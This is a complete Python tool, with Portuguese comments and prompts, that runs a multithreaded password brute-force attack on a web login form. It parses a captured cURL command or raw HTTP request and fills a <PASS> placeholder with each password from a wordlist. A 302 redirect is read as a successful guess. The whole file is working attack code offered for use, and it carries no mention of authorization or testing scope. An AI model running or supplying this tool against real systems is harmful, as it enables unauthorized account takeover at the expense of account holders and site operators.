import re
from urllib.parse import urlparse, urljoin
import requests
import threading
from queue import Queue

NUM_THREADS = 10

# === Converter de cURL (bash) para requisição ===
def convert_curl_to_raw(input_file):
    with open(input_file, "r", encoding="utf-8") as f:
        content = f.read().replace("\\\n", "")

    method = "POST" if "--data" in content else "GET"

    # Extrair URL
    url_match = re.search(r'curl ["\']([^"\']+)["\']', content)
    if not url_match:
        raise Exception("URL não encontrada na linha do curl")
    full_url = url_match.group(1)
    parsed = urlparse(full_url)
    path = parsed.path or "/"
    host = parsed.netloc

    # Extrair headers
    headers = []
    header_matches = re.findall(r"-H [\"\']([^:]+):\s*(.*?)[\"\']", content)
    for hname, hval in header_matches:
        headers.append(f"{hname}: {hval}")

    # Extrair cookies
    cookie_match = re.search(r"-b [\"\'](.+?)[\"\']", content)
    if cookie_match:
        headers.append(f"Cookie: {cookie_match.group(1)}")

    # Extrair corpo
    data_match = re.search(r"--data(?:-raw)? [\"\'](.+?)[\"\']", content)
    data = data_match.group(1).replace('\\n', '').strip() if data_match else ""

    # Garantir Host
    if not any(h.lower().startswith("host:") for h in headers):
        headers.insert(0, f"Host: {host}")

    raw_lines = [f"{method} {path} HTTP/1.1"] + headers + ["", data]
    return method, urljoin(f"https://{host}", path), headers, data


def parse_raw_request(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.read().splitlines()

    method, path, _ = lines[0].split()
    headers = {}
    body_lines = []
    in_body = False

    for line in lines[1:]:
        if line.strip() == "" and not in_body:
            in_body = True
            continue
        if not in_body:
            if ':' in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
        else:
            body_lines.append(line)

    body = ''.join(body_lines).strip()
    host = headers.get('Host')
    if not host:
        raise KeyError("Header 'Host' é obrigatório em request.txt")

    url = urljoin(f"https://{host}", path)
    return method, url, headers, body

def worker(method, url, headers, original_body, queue, stop_event):
    session = requests.Session()

    while not queue.empty() and not stop_event.is_set():
        pwd = queue.get()
        body = original_body.replace('<PASS>', pwd)

        try:
            response = session.request(method, url, headers=headers, data=body, timeout=5, allow_redirects=False)
            status = response.status_code
            length = len(response.text)
            size = len(response.content)
            final_url = response.headers.get("Location", url)

            if status == 302:
                
                redirected_response = session.get(urljoin(url, final_url), headers=headers, timeout=5)
                redirected_length = len(redirected_response.text)
                redirected_size = len(redirected_response.content)
                print(f"[+] SUCESSO: {pwd} | [302] redirecionado para: {final_url} | length={redirected_length} | size={redirected_size}")
                stop_event.set()
            else:
                print(f"[-] {pwd} | [{status}] length={length} | size={size}")

        except Exception as e:
            print(f"[!] Erro com '{pwd}': {e}")
        finally:
            queue.task_done()

def main():
    print("=== Brute-force via cURL ===\n")
    modo = input("Modo: (1) Importar cURL .txt ou (2) Usar request.txt existente? [1/2]: ").strip()

    if modo == "1":
        curl_path = input("Caminho do arquivo com cURL (bash): ").strip()
        method, url, headers_list, body = convert_curl_to_raw(curl_path)
        request_path = "request.txt"
        with open(request_path, "w", encoding="utf-8") as f:
            f.write(f"{method} {urlparse(url).path} HTTP/1.1\n")
            for h in headers_list:
                f.write(h + "\n")
            f.write("\n" + body)
        print("[+] request.txt gerado (não se esqueça de adicionar <PASS> no campo de brute-force). Prosseguindo com brute-force...\n")
    else:
        request_path = input("Caminho para request.txt: ").strip()

    method, url, headers, body = parse_raw_request(request_path)

    wordlist_path = input("Caminho da wordlist: ").strip()
    with open(wordlist_path, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    queue = Queue()
    for pwd in passwords:
        queue.put(pwd)

    stop_event = threading.Event()
    threads = []

    print(f"\nURL alvo: {url}\nMétodo: {method}\nTentativas: {len(passwords)} senhas\n")

    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(method, url, headers, body, queue, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()
    print("\n[+] Ataque concluído.")

if __name__ == "__main__":
    main()
